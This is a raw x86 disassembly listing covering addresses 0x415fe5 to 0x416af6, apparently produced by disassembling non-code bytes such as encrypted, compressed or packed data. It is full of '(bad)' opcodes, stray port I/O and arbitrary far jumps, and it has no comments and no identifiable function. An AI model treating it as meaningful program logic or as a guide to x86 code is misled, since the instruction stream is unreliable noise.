  415fe5:	jmp    0xcf7b1b8b
  415fea:	jge    0x415ff4
  415fec:	popf   
	...
  416055:	add    BYTE PTR [edi],dl
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	fadd   QWORD PTR [ebp-0x12ae93fe]
  416068:	add    BYTE PTR [eax],al
  41606a:	inc    DWORD PTR [eax]
  41606c:	add    BYTE PTR [eax],al
  41606e:	es mov ch,0x1d
  416071:	mov    al,0x21
  416073:	adc    ebx,ecx
  416075:	loope  0x416068
  416077:	enter  0x1a56,0x5e
  41607b:	stc    
  41607c:	inc    esp
  41607d:	mov    ch,0x35
  41607f:	stc    
  416080:	xchg   esp,eax
  416081:	jnp    0x4160b1
  416083:	add    BYTE PTR [edi+0x4],ch
  416086:	and    al,BYTE PTR [edx]
  416088:	stc    
  416089:	push   ds
  41608a:	popa   
  41608b:	mov    ds:0x4ebea2d2,eax
  416090:	test   al,0x21
  416092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416093:	dec    esi
  416094:	sub    BYTE PTR [esi-0x6d69629d],cl
  41609a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41609b:	add    BYTE PTR [edx-0x46],ah
  41609e:	mov    bh,0xd0
  4160a0:	push   eax
  4160a1:	and    al,BYTE PTR [edi+0x53]
  4160a4:	fcmovnbe st,st(1)
  4160a6:	xor    al,0xea
  4160a8:	or     DWORD PTR [edx+eax*1+0x46],ebx
  4160ac:	int3   
  4160ad:	scas   al,BYTE PTR es:[edi]
  4160ae:	pop    ss
  4160af:	das    
  4160b0:	loope  0x41608a
  4160b2:	dec    esi
  4160b3:	adc    al,0xbd
  4160b5:	call   0xe5a1a9ad
  4160ba:	xor    eax,0x3c9d1c56
  4160bf:	enter  0x3498,0x5e
  4160c3:	outs   dx,BYTE PTR ds:[esi]
  4160c4:	sub    ecx,ebp
  4160c6:	shl    BYTE PTR [ebp+esi*8+0x2043c25f],cl
  4160cd:	jnp    0x416116
  4160cf:	int    0xf1
  4160d1:	add    BYTE PTR [edx+ecx*1-0x6532e111],bl
  4160d8:	test   eax,0xb4876be6
  4160dd:	cmc    
  4160de:	sub    ebx,ebx
  4160e0:	add    al,0x27
  4160e2:	stos   BYTE PTR es:[edi],al
  4160e3:	in     al,dx
  4160e4:	(bad)  
  4160e5:	rep stos BYTE PTR es:[edi],al
  4160e7:	cld    
  4160e8:	dec    ebx
  4160e9:	int3   
  4160ea:	mov    al,ds:0x314c151c
  4160ef:	xchg   ecx,eax
  4160f0:	jecxz  0x416133
  4160f2:	xchg   esi,eax
  4160f3:	idiv   DWORD PTR [esi+0x6bb76502]
  4160f9:	rcr    DWORD PTR [esi-0x3f],0x51
  4160fd:	lods   eax,DWORD PTR ds:[esi]
  4160fe:	dec    ebp
  4160ff:	mov    BYTE PTR [esi],bh
  416101:	dec    ebx
  416102:	out    0xca,al
  416104:	dec    edi
  416105:	mov    ecx,0x29cd6740
  41610a:	mov    eax,ds:0xae9a7efb
  41610f:	jecxz  0x4160ce
  416111:	in     al,dx
  416112:	fstp   QWORD PTR [esi-0x6f]
  416115:	and    ah,cl
  416117:	inc    ebx
  416118:	add    eax,0x8038f3aa
  41611d:	push   eax
  41611e:	jecxz  0x416195
  416120:	sub    cl,dh
  416122:	dec    edi
  416123:	(bad)  
  416124:	in     al,0xfb
  416126:	pop    esp
  416127:	mov    eax,ds:0xb2b45f33
  41612c:	sbb    eax,0x506cf9f2
  416131:	test   al,dl
  416133:	fldcw  WORD PTR ds:0x5075e988
  416139:	push   ss
  41613a:	(bad)  
  41613b:	leave  
  41613c:	xlat   BYTE PTR ds:[ebx]
  41613d:	or     al,0x6f
  41613f:	add    ebx,ecx
  416141:	jecxz  0x416198
  416143:	in     eax,dx
  416144:	ret    0xf7f6
  416147:	fdiv   st(5),st
  416149:	mov    ebp,DWORD PTR [ecx+0x4e]
  41614c:	enter  0xa1d3,0xd9
  416150:	in     al,dx
  416151:	mov    esp,0x64e4ed91
  416156:	dec    esi
  416157:	(bad)  
  416158:	aas    
  416159:	fs jbe 0x41617c
  41615c:	sahf   
  41615d:	sub    DWORD PTR [esi],ecx
  41615f:	leave  
  416160:	in     eax,dx
  416161:	stc    
  416162:	test   DWORD PTR [edi-0x522e6cf5],edx
  416168:	sub    DWORD PTR [ebx-0xd],eax
  41616b:	into   
  41616c:	outs   dx,BYTE PTR ds:[esi]
	...
  4161d5:	add    BYTE PTR [eax],ah
  4161d7:	jmp    0xdf3d4017
  4161dc:	in     eax,0xff
  4161de:	(bad)  
  4161df:	push   edx
  4161e0:	sub    eax,0x8a857ef3
  4161e5:	mov    eax,0xee50
  4161ea:	inc    DWORD PTR [eax]
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	pop    ebx
  4161ef:	jg     0x416224
  4161f1:	scas   eax,DWORD PTR es:[edi]
  4161f2:	push   ds
  4161f3:	scas   al,BYTE PTR es:[edi]
  4161f4:	fdiv   QWORD PTR [edi-0x6b38dcb6]
  4161fa:	cmc    
  4161fb:	push   0xe147bcf8
  416200:	dec    ecx
  416201:	iret   
  416202:	sti    
  416203:	scas   eax,DWORD PTR es:[edi]
  416204:	ret    0x46d0
  416207:	sbb    esp,esi
  416209:	(bad)  
  41620a:	jg     0x416224
  41620c:	cmc    
  41620d:	add    dh,BYTE PTR [ecx]
  41620f:	xchg   BYTE PTR [ebp+0x5d],bh
  416212:	or     eax,0xdc995e5
  416217:	fmul   QWORD PTR [ebx+0x6f]
  41621a:	or     BYTE PTR [edi+0x50],cl
  41621d:	pop    esp
  41621e:	bound  ebp,QWORD PTR [esi+0xd4b1b8]
  416224:	int3   
  416225:	mov    eax,0x54fc2c42
  41622a:	retf   0x8277
  41622d:	inc    esi
  41622e:	sub    edx,DWORD PTR [eax]
  416230:	aas    
  416231:	(bad)  
  416232:	or     eax,0x5149aea
  416237:	ja     0x416281
  416239:	loopne 0x41626a
  41623b:	mov    ds:0x7cddf477,eax
  416240:	fst    QWORD PTR [ebx+eax*1]
  416243:	mov    esp,0xeafea861
  416248:	sub    al,0xc1
  41624a:	jge    0x41629d
  41624c:	cmp    eax,DWORD PTR [eax]
  41624e:	retf   0xe7b7
  416251:	sub    eax,0x25d5c5c3
  416256:	ins    BYTE PTR es:[edi],dx
  416257:	dec    ebp
  416258:	cwde   
  416259:	or     esp,ecx
  41625b:	dec    edi
  41625c:	or     eax,0x12eb580b
  416261:	add    DWORD PTR [eax-0x6483b3a8],eax
  416267:	ret    
  416268:	push   0x72
  41626a:	lahf   
  41626b:	dec    esp
  41626c:	pop    esi
  41626d:	or     bl,bh
  41626f:	rcl    bh,cl
  416271:	sbb    eax,0xeeaa5081
  416276:	loope  0x41620a
  416278:	lods   al,BYTE PTR ds:[esi]
  416279:	enter  0x6e6,0xbe
  41627d:	imul   eax,DWORD PTR [edi-0x24],0x2d
  416281:	push   ds
  416282:	fmul   DWORD PTR ds:0x2efc6f51
  416288:	sti    
  416289:	pop    eax
  41628a:	xchg   sp,ax
  41628c:	and    eax,0x63c6fa40
  416291:	cmovnp edx,DWORD PTR [edi+0x7e4a0a60]
  416298:	imul   eax,DWORD PTR [ebp-0x35d9f1ba],0x43c3647c
  4162a2:	xlat   BYTE PTR ds:[ebx]
  4162a3:	int    0xdd
  4162a5:	pushf  
  4162a6:	fbld   TBYTE PTR [ecx]
  4162a8:	ret    
  4162a9:	pushf  
  4162aa:	and    BYTE PTR ds:0x309c63f5,ah
  4162b0:	cmp    dl,BYTE PTR [edi+eax*4+0x16523ca5]
  4162b7:	imul   ecx,ebx,0x8b55bf95
  4162bd:	fist   DWORD PTR [ebx+0xe58de10]
  4162c3:	jp     0x4162ec
  4162c5:	fisttp DWORD PTR ds:0xd811465f
  4162cb:	das    
  4162cc:	cmp    eax,0xf4ad3016
  4162d1:	jecxz  0x4162ab
  4162d3:	daa    
  4162d4:	mov    al,BYTE PTR [eax]
  4162d6:	cmp    BYTE PTR [esi],ah
  4162d8:	aas    
  4162d9:	mov    edi,0x2591ca54
  4162de:	sub    BYTE PTR [ebp-0x29],cl
  4162e1:	test   BYTE PTR [edx],dl
  4162e3:	add    DWORD PTR [eax],ecx
  4162e5:	fimul  WORD PTR [eax+0x63c8ced3]
  4162eb:	popa   
  4162ec:	mov    DWORD PTR [eax],0x0
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x4f89:0x1d1307ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	inc    DWORD PTR [eax]
  41636c:	add    BYTE PTR [eax],al
  41636e:	cli    
  41636f:	sub    al,0x2c
  416371:	mov    edx,0xab3297b3
  416376:	mov    edx,0x63a411ba
  41637b:	fs ja  0x41639a
  41637e:	mov    ebp,0xf7b9c677
  416383:	ja     0x41636a
  416385:	mov    cl,0x3
  416387:	and    ah,BYTE PTR [eax]
  416389:	push   esi
  41638a:	push   eax
  41638b:	fmul   QWORD PTR [esi]
  41638d:	bnd jl 0x41634c
  416390:	inc    ecx
  416391:	loope  0x416327
  416393:	push   0xffffffb9
  416395:	rol    DWORD PTR [edi-0x522e53b1],0x18
  41639c:	(bad)  
  41639e:	sbb    BYTE PTR [edi],bh
  4163a0:	or     al,0x48
  4163a2:	jmp    0x41635a
  4163a4:	or     DWORD PTR [esi+0x40],eax
  4163a7:	mov    eax,0x3373fb20
  4163ac:	clc    
  4163ad:	mov    al,ds:0x43139dca
  4163b2:	mov    dh,0x75
  4163b4:	retf   
  4163b5:	lahf   
  4163b6:	jecxz  0x41640e
  4163b8:	rcr    BYTE PTR [eax+0xb50eb8e],0x39
  4163bf:	inc    ebx
  4163c0:	mov    al,ds:0x7b2b3d8c
  4163c5:	adc    BYTE PTR [esp+ebx*8-0x44],dh
  4163c9:	xchg   edi,eax
  4163ca:	pushf  
  4163cb:	hlt    
  4163cc:	lods   al,BYTE PTR ds:[esi]
  4163cd:	sub    DWORD PTR [esi],esi
  4163cf:	push   0x15995d90
  4163d4:	adc    BYTE PTR [esi-0x76],bh
  4163d7:	(bad)  [edx+0xe6507e3]
  4163dd:	mov    esi,0x3174180
  4163e2:	ins    DWORD PTR es:[edi],dx
  4163e3:	push   ecx
  4163e4:	nop
  4163e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e6:	xor    DWORD PTR [ebx],eax
  4163e8:	in     eax,dx
  4163e9:	pop    ebp
  4163ea:	out    dx,al
  4163eb:	in     al,0xc6
  4163ed:	cmp    ebp,DWORD PTR [edx+0x13]
  4163f0:	dec    esi
  4163f1:	cmp    esi,ebx
  4163f3:	in     eax,0xf3
  4163f5:	xchg   edi,eax
  4163f6:	mov    eax,ds:0x685784d7
  4163fb:	adc    ecx,edi
  4163fd:	lahf   
  4163fe:	inc    eax
  4163ff:	and    edi,0x19c10f2e
  416405:	push   esi
  416406:	loope  0x41641d
  416408:	mov    dh,0x42
  41640a:	push   esp
  41640b:	pop    eax
  41640c:	cld    
  41640d:	adc    al,0x0
  41640f:	stos   BYTE PTR es:[edi],al
  416410:	aam    0xee
  416412:	inc    ebp
  416413:	push   ebx
  416414:	mov    DWORD PTR [eax-0xb],edi
  416417:	mov    ch,0x75
  416419:	add    cl,BYTE PTR [ecx]
  41641b:	inc    edx
  41641c:	out    dx,al
  41641d:	repnz aad 0x9a
  416420:	cmp    edx,DWORD PTR [edi+ecx*1]
  416423:	dec    edx
  416424:	test   al,0xc6
  416426:	mov    esi,0x1265d7b5
  41642b:	arpl   WORD PTR [ecx],bp
  41642d:	add    ecx,0x6e
  416430:	mov    ds:0xd9115757,al
  416435:	inc    esp
  416436:	nop
  416437:	jne    0x41644b
  416439:	std    
  41643a:	je     0x4163d6
  41643c:	fucomip st,st(1)
  41643e:	mov    ds:0xd9b2e582,eax
  416443:	out    dx,eax
  416444:	out    dx,al
  416445:	pop    esp
  416446:	jmp    0x416450
  416448:	or     esp,DWORD PTR ds:0x7c30d6f9
  41644e:	daa    
  41644f:	pushf  
  416450:	sbb    DWORD PTR [ecx],esp
  416452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416453:	dec    esi
  416454:	arpl   WORD PTR [esi+edx*2+0x1c],bx
  416458:	jns    0x416466
  41645a:	loop   0x4163df
  41645c:	iret   
  41645d:	bswap  edx
  41645f:	inc    ebp
  416460:	rcr    BYTE PTR [edi],cl
  416462:	and    DWORD PTR [edx],esp
  416464:	mov    ch,0x8a
  416466:	xor    DWORD PTR [ebp-0xe8ec17c],ebp
  41646c:	or     al,BYTE PTR [eax]
	...
  4164d6:	repz inc ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	mov    ebp,0x4ef8bdf0
  4164e7:	lock add BYTE PTR [eax],al
  4164ea:	inc    DWORD PTR [eax]
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	and    al,0xc2
  4164f0:	pop    esp
  4164f1:	test   BYTE PTR [ecx],bh
  4164f3:	hlt    
  4164f4:	sahf   
  4164f5:	mov    ds:0x7b7d5b30,al
  4164fa:	sbb    bl,BYTE PTR [eax+ebp*4-0x462556e0]
  416501:	and    dl,BYTE PTR [edi-0x7b]
  416504:	popa   
  416505:	xor    eax,0x10d95ea3
  41650a:	(bad)  
  41650b:	cli    
  41650c:	jmp    0x739dad68
  416511:	adc    BYTE PTR [ecx+0xd67f23d],ah
  416517:	push   edi
  416518:	sub    DWORD PTR [ebp+0x30],ebx
  41651b:	jmp    0xe59a:0xef112d75
  416522:	inc    ecx
  416523:	lock lods al,BYTE PTR ds:[esi]
  416525:	je     0x41652c
  416527:	retf   
  416528:	loope  0x4164d9
  41652a:	xchg   ecx,eax
  41652b:	push   DWORD PTR ss:[edi]
  41652e:	cmp    esp,edx
  416530:	int    0xcf
  416532:	lock iret 
  416534:	mov    WORD PTR [edi],?
  416536:	sahf   
  416537:	gs scas eax,DWORD PTR es:[edi]
  416539:	and    ebp,DWORD PTR [ecx-0x65411f34]
  41653f:	call   0x2790:0x53176622
  416546:	test   esp,0x2d22aedd
  41654c:	adc    dl,BYTE PTR ds:0x6e4153a1
  416552:	or     DWORD PTR ds:0x755cca7d,0xffffffaf
  416559:	push   esi
  41655a:	es pushf 
  41655c:	mov    ecx,0xa5cf64b9
  416561:	mov    esp,0x4066ef73
  416566:	or     ebx,eax
  416568:	jmp    0x4d471d56
  41656d:	mov    dh,dh
  41656f:	mov    bl,0xa
  416571:	push   0xffffffb1
  416573:	arpl   WORD PTR [ebp-0x1559867],cx
  416579:	cdq    
  41657a:	or     edi,DWORD PTR [esi]
  41657c:	into   
  41657d:	xchg   ebx,eax
  41657e:	push   ecx
  41657f:	sbb    DWORD PTR [ebx-0x8],esp
  416582:	and    dh,BYTE PTR [ecx+0x46577052]
  416588:	in     al,0x3a
  41658a:	arpl   cx,si
  41658c:	cmp    ebp,DWORD PTR [esi+eax*1-0x45891fe0]
  416593:	mov    BYTE PTR [esi-0x5b],bh
  416596:	jo     0x41651e
  416598:	scas   al,BYTE PTR es:[edi]
  416599:	loope  0x41658d
  41659b:	(bad)  
  41659c:	cli    
  41659d:	call   0x8bd2:0x36f6c599
  4165a4:	adc    DWORD PTR [esi-0x47],esi
  4165a7:	push   ebp
  4165a8:	aas    
  4165a9:	gs jbe 0x416551
  4165ac:	outs   dx,DWORD PTR ds:[esi]
  4165ad:	inc    ecx
  4165ae:	jnp    0x416539
  4165b0:	push   es
  4165b1:	push   0xa4eb236b
  4165b6:	neg    BYTE PTR [eax+0x3b4cc374]
  4165bc:	add    esi,edx
  4165be:	jnp    0x416639
  4165c0:	or     al,0xd0
  4165c2:	(bad)  
  4165c3:	call   0xd766696
  4165c8:	mov    ah,ch
  4165ca:	xor    ah,BYTE PTR [ebp+esi*2-0x19a049ed]
  4165d1:	mov    cl,0x0
  4165d3:	packuswb mm0,mm1
  4165d6:	addr16 inc esi
  4165d8:	aaa    
  4165d9:	push   ebx
  4165da:	mov    cl,0x81
  4165dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165dd:	ss pop es
  4165df:	out    0x2,eax
  4165e1:	in     al,dx
  4165e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e3:	out    0x41,al
  4165e5:	adc    eax,edi
  4165e7:	rcl    DWORD PTR [edx+ecx*2-0x9],1
  4165eb:	lea    ebp,[ebp+0x0]
	...
  416655:	add    BYTE PTR ds:0xfff32bd8,ah
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi+0x7d4fbcac]
  416663:	add    al,0x94
  416665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416666:	dec    ebp
  416667:	icebp  
  416668:	add    BYTE PTR [eax],al
  41666a:	inc    DWORD PTR [eax]
  41666c:	add    BYTE PTR [eax],al
  41666e:	dec    ebx
  416670:	cmp    eax,0xd417d27d
  416675:	inc    ebx
  416676:	iret   
  416677:	jecxz  0x4166e4
  416679:	cs dec ecx
  41667b:	stos   DWORD PTR es:[edi],eax
  41667c:	jne    0x41668d
  41667e:	ret    0x6cc5
  416681:	in     al,0xf4
  416683:	xor    bh,al
  416685:	pop    ecx
  416686:	ins    BYTE PTR es:[edi],dx
  416687:	inc    esp
  416688:	jnp    0x416670
  41668a:	dec    ebp
  41668b:	ins    DWORD PTR es:[edi],dx
  41668c:	js     0x4166c4
  41668e:	xchg   esp,eax
  41668f:	adc    DWORD PTR [ebx+0x26],0x73
  416693:	xchg   BYTE PTR [ebx-0x47bfe516],bl
  416699:	(bad)  
  41669a:	pop    ebp
  41669b:	fisub  DWORD PTR [edi]
  41669d:	xchg   edx,eax
  41669e:	retf   
  41669f:	scas   al,BYTE PTR es:[edi]
  4166a0:	not    BYTE PTR [edi+0x593abc36]
  4166a6:	(bad)  
  4166a7:	push   edx
  4166a8:	push   eax
  4166a9:	je     0x4166d6
  4166ab:	mov    ds:0xc00e8257,al
  4166b0:	pushf  
  4166b1:	ffreep st(4)
  4166b3:	leave  
  4166b4:	icebp  
  4166b5:	cmp    al,BYTE PTR [ecx+0x7b]
  4166b8:	mov    al,0x5a
  4166ba:	(bad)  
  4166bb:	pop    eax
  4166bc:	cmp    BYTE PTR [edi+edi*1+0x6e],0xd5
  4166c1:	cmp    eax,0x52d411fd
  4166c6:	add    BYTE PTR [ecx-0x4f7b39d8],0xdf
  4166cd:	mov    dh,0x64
  4166cf:	lods   al,BYTE PTR ds:[esi]
  4166d0:	shr    eax,0x84
  4166d3:	sub    dl,BYTE PTR [esi-0x80]
  4166d6:	xlat   BYTE PTR gs:[ebx]
  4166d8:	push   edx
  4166d9:	inc    esi
  4166da:	mov    al,0x76
  4166dc:	fldenv [edi+0x55fedfae]
  4166e2:	std    
  4166e3:	xlat   BYTE PTR ds:[ebx]
  4166e4:	mov    edx,0x69c9e931
  4166e9:	outs   dx,DWORD PTR ds:[esi]
  4166ea:	repnz push eax
  4166ec:	pop    ebp
  4166ed:	es aad 0x37
  4166f0:	arpl   WORD PTR [edi-0x34],si
  4166f3:	ins    DWORD PTR es:[edi],dx
  4166f4:	int    0x1b
  4166f6:	xlat   BYTE PTR ds:[ebx]
  4166f7:	pop    ebp
  4166f8:	je     0x416743
  4166fa:	mov    ds:0xa380ddb6,al
  4166ff:	mov    bl,0xef
  416701:	(bad)  
  416702:	mov    al,ds:0x46ee972c
  416707:	nop
  416708:	xor    dh,BYTE PTR [edx+0x21586959]
  41670e:	or     al,0x34
  416710:	shl    BYTE PTR [edi-0x49],cl
  416713:	inc    BYTE PTR [ecx]
  416715:	mov    DWORD PTR [edi],eax
  416717:	push   es
  416718:	xchg   edi,eax
  416719:	outs   dx,BYTE PTR ds:[esi]
  41671a:	push   ecx
  41671b:	loop   0x416790
  41671d:	sub    bl,bh
  41671f:	in     eax,0xcf
  416721:	pop    esi
  416722:	push   ebx
  416723:	adc    dl,BYTE PTR [esi+0x886f684]
  416729:	fldcw  WORD PTR [eax+0x37]
  41672c:	push   0x39249c93
  416731:	arpl   WORD PTR [esi],bx
  416733:	mov    ebp,0x8cdce59c
  416738:	sub    cl,BYTE PTR [ebx+0x54a2eb2d]
  41673e:	repz xchg ebx,eax
  416740:	mov    DWORD PTR [edx+0x457a96ce],esp
  416746:	arpl   WORD PTR [ebx],dx
  416748:	pop    edx
  416749:	sub    dl,BYTE PTR [edi]
  41674b:	inc    eax
  41674c:	add    BYTE PTR [edx],0xf9
  41674f:	or     DWORD PTR [edi],ecx
  416751:	stos   DWORD PTR es:[edi],eax
  416752:	xchg   BYTE PTR [ebx],bh
  416754:	add    DWORD PTR [ebp+0x41c82511],ebx
  41675a:	or     DWORD PTR [edx],esp
  41675c:	test   BYTE PTR [edi+0x26d0294b],bl
  416762:	sub    al,0x3f
  416764:	retf   0xb4a1
  416767:	es clc 
  416769:	ins    BYTE PTR es:[edi],dx
  41676a:	sbb    bl,BYTE PTR [eax]
  41676c:	cli    
	...
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	push   ecx
  4167e3:	push   ebx
  4167e4:	mov    esi,0xf24c
  4167ea:	inc    DWORD PTR [eax]
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	inc    ebp
  4167ef:	sub    ah,ch
  4167f1:	hlt    
  4167f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f3:	xchg   esi,eax
  4167f4:	and    edi,DWORD PTR [esi+0x58]
  4167f7:	gs jg  0x41685c
  4167fa:	std    
  4167fb:	or     DWORD PTR [ebp+0x5d],ebx
  4167fe:	dec    esi
  4167ff:	push   es
  416800:	mov    cl,0xc9
  416802:	pop    eax
  416803:	dec    ebp
  416804:	or     eax,0x87fb39d3
  416809:	add    al,0xce
  41680b:	or     DWORD PTR [ebx+0x60],esp
  41680e:	ds push 0xffffffe1
  416811:	call   0x336c7823
  416816:	jle    0x41686c
  416818:	cmc    
  416819:	rcr    cl,0x1a
  41681c:	jmp    0xc5aa:0xb17e01ad
  416823:	xchg   edi,eax
  416824:	pop    ds
  416825:	loope  0x416843
  416827:	jb     0x416864
  416829:	shl    bl,1
  41682b:	xor    ecx,DWORD PTR [ebx-0x272da02f]
  416831:	pop    ebp
  416832:	ror    dh,0x67
  416835:	push   es
  416836:	jp     0x41682f
  416838:	xor    esp,DWORD PTR [edi-0x6caaa11e]
  41683e:	daa    
  41683f:	cmp    al,0x3e
  416841:	(bad)  
  416842:	arpl   WORD PTR [ecx+ecx*2],dx
  416845:	or     dh,BYTE PTR [ebp+0x45]
  416848:	and    al,0xe5
  41684a:	mov    ds:0x9cf011a,eax
  41684f:	dec    edx
  416850:	jmp    0x41684a
  416852:	sbb    BYTE PTR [esi],ch
  416854:	(bad)  
  416855:	in     al,0x3b
  416857:	dec    eax
  416858:	mul    DWORD PTR [esi-0x76ac019]
  41685e:	mov    al,0x86
  416860:	or     al,0xad
  416862:	ret    0x394f
  416865:	(bad)  
  416866:	sub    eax,0x3ede9709
  41686b:	push   es
  41686c:	push   ds
  41686d:	ss js  0x4168a8
  416870:	inc    ebp
  416871:	push   es
  416872:	out    dx,eax
  416873:	mov    ah,0x15
  416875:	xchg   ecx,eax
  416876:	or     DWORD PTR [edi],0xeee58a83
  41687c:	pop    ss
  41687d:	jecxz  0x416840
  41687f:	add    cl,cl
  416881:	dec    eax
  416882:	inc    edi
  416883:	retf   0x896c
  416886:	jle    0x4168e3
  416888:	xor    al,0x7c
  41688a:	int    0x9c
  41688c:	lea    edx,[ecx+0x56be709a]
  416892:	scas   eax,DWORD PTR es:[edi]
  416893:	and    DWORD PTR ds:0x807a6c9d,ecx
  416899:	and    ch,ch
  41689b:	mov    esp,0xb5e9808c
  4168a0:	mov    cl,al
  4168a2:	retf   
  4168a3:	aad    0x8d
  4168a5:	mov    edx,0xfc4ff8ac
  4168aa:	mov    esp,0xd14087c0
  4168af:	test   eax,0x733004ee
  4168b4:	add    ebp,DWORD PTR [ebp+0x52d4eee6]
  4168ba:	mov    ebp,esi
  4168bc:	fisttp WORD PTR [edx-0x361d400e]
  4168c2:	sub    dh,bh
  4168c4:	add    dl,BYTE PTR [ebx]
  4168c6:	fsub   QWORD PTR [ecx]
  4168c8:	fist   WORD PTR [ebp-0x7606cdfd]
  4168ce:	cwde   
  4168cf:	push   ebx
  4168d0:	outs   dx,DWORD PTR ds:[esi]
  4168d1:	inc    esp
  4168d2:	sub    eax,0x3083e29f
  4168d7:	sub    DWORD PTR [esp+ecx*8],0x70
  4168db:	aaa    
  4168dc:	ss push cs
  4168de:	fst    DWORD PTR ds:0x22699ab5
  4168e4:	dec    edi
  4168e5:	sbb    bh,ah
  4168e7:	cmp    eax,0x3937d69b
  4168ec:	push   cs
	...
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0xa6ba0dd3
  416966:	dec    ebx
  416967:	repz add BYTE PTR [eax],al
  41696a:	inc    DWORD PTR [eax]
  41696c:	add    BYTE PTR [eax],al
  41696e:	lea    edx,[ebp-0x4ebca2c2]
  416974:	fstp   QWORD PTR [eax+0x38ab809f]
  41697a:	jg     0x4169a0
  41697c:	dec    edx
  41697d:	fld    st(5)
  41697f:	(bad)  
  416980:	xchg   esi,eax
  416981:	xor    ebx,ebx
  416983:	pusha  
  416984:	dec    ecx
  416985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416986:	nop
  416987:	sub    BYTE PTR [ecx],bl
  416989:	cwde   
  41698a:	jp     0x41695d
  41698c:	sar    BYTE PTR [ebx],cl
  41698e:	and    al,BYTE PTR [esi]
  416990:	jmp    0xc512133f
  416995:	xchg   ebx,eax
  416996:	(bad)  
  416997:	scas   al,BYTE PTR es:[edi]
  416998:	add    al,bl
  41699a:	mov    eax,0x9d3cef9e
  41699f:	or     dh,BYTE PTR [edx+0x9]
  4169a2:	icebp  
  4169a3:	(bad)  
  4169a4:	jmp    0x323887e0
  4169a9:	xchg   ebp,eax
  4169aa:	es sub al,0xbf
  4169ad:	scas   al,BYTE PTR es:[edi]
  4169ae:	into   
  4169af:	mov    esi,0xd38ccacf
  4169b4:	imul   edi,edx,0xfffffff1
  4169b7:	inc    edi
  4169b8:	dec    ecx
  4169b9:	ins    DWORD PTR es:[edi],dx
  4169ba:	scas   eax,DWORD PTR es:[edi]
  4169bb:	push   0xffffffd4
  4169bd:	outs   dx,DWORD PTR ds:[esi]
  4169be:	dec    eax
  4169bf:	pop    DWORD PTR [ebx+edx*1-0x75]
  4169c3:	popf   
  4169c4:	adc    cl,al
  4169c6:	mov    ds:0x2c22e567,eax
  4169cb:	adc    BYTE PTR [ebx-0x443156b0],cl
  4169d1:	ds sub al,0x59
  4169d4:	call   0x4d26:0x643fb466
  4169db:	mul    BYTE PTR [ebx+0x4198cb69]
  4169e1:	int3   
  4169e2:	shr    BYTE PTR [edi+0x74a8ccf],cl
  4169e8:	jg     0x416a64
  4169ea:	cld    
  4169eb:	lea    eax,[edx+0x4cd7c4c9]
  4169f1:	jp     0x416a1e
  4169f3:	and    eax,0x34723708
  4169f8:	mov    eax,ds:0x411723f8
  4169fd:	scas   eax,DWORD PTR es:[edi]
  4169fe:	cwde   
  4169ff:	loop   0x4169bc
  416a01:	sub    eax,DWORD PTR [ebx+0x5e9201a0]
  416a07:	mov    esi,0x12ba309b
  416a0c:	div    DWORD PTR [esi+0x12]
  416a0f:	(bad)  
  416a10:	mov    dh,BYTE PTR [edi]
  416a12:	scas   al,BYTE PTR es:[edi]
  416a13:	adc    al,0x2c
  416a15:	jae    0x416a32
  416a17:	out    dx,al
  416a18:	push   ebp
  416a19:	popf   
  416a1a:	mov    edi,0x298c0cbc
  416a1f:	push   edi
  416a20:	aas    
  416a21:	ja     0x4169f9
  416a23:	popf   
  416a24:	iret   
  416a25:	xchg   edi,eax
  416a26:	jno    0x416aa6
  416a28:	mov    al,ds:0x12829197
  416a2d:	add    eax,0xb6955464
  416a32:	sbb    BYTE PTR [esp+eiz*4],0x2c
  416a36:	sub    DWORD PTR ds:0x28391c0c,ebp
  416a3c:	jl     0x416a9b
  416a3e:	jmp    0x51c:0x603a3c10
  416a45:	mov    ecx,0x31ccc3e7
  416a4a:	arpl   WORD PTR [esi-0x1765e26a],si
  416a50:	js     0x416a57
  416a52:	mov    dh,0x81
  416a54:	lock dec ebx
  416a56:	jbe    0x416ac8
  416a58:	push   ds
  416a59:	jl     0x416a45
  416a5b:	xor    DWORD PTR [esi+0x5e],ecx
  416a5e:	adc    BYTE PTR [edi+0x34a69385],0x6b
  416a65:	cmp    ecx,DWORD PTR [ecx+0x4fcb7e3e]
  416a6b:	xlat   BYTE PTR ds:[ebx]
  416a6c:	mov    esp,0x0
	...
  416ad5:	add    bl,cl
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x12d70ba3
  416ae4:	(bad)  [eax+0xf44a]
  416aea:	inc    DWORD PTR [eax]
  416aec:	add    BYTE PTR [eax],al
  416aee:	jecxz  0x416b2c
  416af0:	loopne 0x416b66
  416af2:	cs mov dh,0xef
  416af5:	std    
  416af6:	xchg   ecx,eax
